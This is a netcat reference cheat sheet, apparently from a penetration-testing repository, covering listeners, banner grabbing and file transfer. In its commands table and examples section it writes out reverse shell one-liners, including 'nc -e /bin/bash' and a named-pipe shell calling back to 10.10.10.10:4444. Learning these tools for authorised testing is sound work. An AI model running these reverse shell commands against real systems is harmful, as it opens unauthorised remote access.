# Netcat Cheat Sheet

## Overview

Netcat (`nc`) is a general-purpose networking utility for reading/writing data across TCP or UDP connections — commonly used for setting up listeners, catching reverse shells, banner grabbing, and simple file transfer.

> [!NOTE]
> This is a general-purpose reference sheet. Netcat was not directly used in the engagement documented in this repository — privilege escalation used a Python `pty.spawn` payload invoked via `sudo` rather than a network-based reverse shell (see [`docs/07-Privilege-Escalation`](../docs/07-Privilege-Escalation/README.md)).

## Common Syntax

```bash
nc [options] <host> <port>
```

## Useful Commands

| Command | Description |
|---|---|
| `nc -lvnp <port>` | Start a listener on the attacking machine |
| `nc <target> <port>` | Connect to a listening service (e.g., banner grabbing) |
| `nc -lvnp <port> > file.out` | Receive a file over a raw connection |
| `nc <target> <port> < file.in` | Send a file over a raw connection |
| `nc -e /bin/bash <attacker-ip> <port>` | Spawn a shell back to a listener (where `-e` is supported) |

## Important Options

| Option | Description |
|---|---|
| `-l` | Listen mode |
| `-v` | Verbose output |
| `-n` | Skip DNS resolution |
| `-p <port>` | Local port to bind (with `-l`) |
| `-e <program>` | Execute a program on connection (not present in all netcat builds, e.g., stripped-down/`nc.traditional` builds may lack it) |
| `-w <seconds>` | Connection/idle timeout |

## Examples

```bash
# Attacker: start a listener
nc -lvnp 4444

# Target (if -e is supported): connect back and spawn a shell
nc -e /bin/bash 10.10.10.10 4444

# Target (if -e is unsupported): use a named-pipe based reverse shell
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.10.10 4444 > /tmp/f
```

## Common Mistakes

- Assuming `-e` is available on every netcat build — many hardened/minimal builds strip it out, requiring a named-pipe-based alternative.
- Forgetting `-n` and having DNS resolution delays slow down connection attempts.
- Leaving a listener bound to a port that's already blocked by a firewall on the attacking side.

## References

- [Netcat man page](https://man.openbsd.org/nc)

## Key Takeaways

- Netcat is equally useful for offense (listeners/shells) and diagnostics (banner grabbing, raw connection testing).
- Always have a fallback shell technique (named pipes, `/dev/tcp`, language-specific one-liners) in case `-e` isn't available on the target's netcat build.
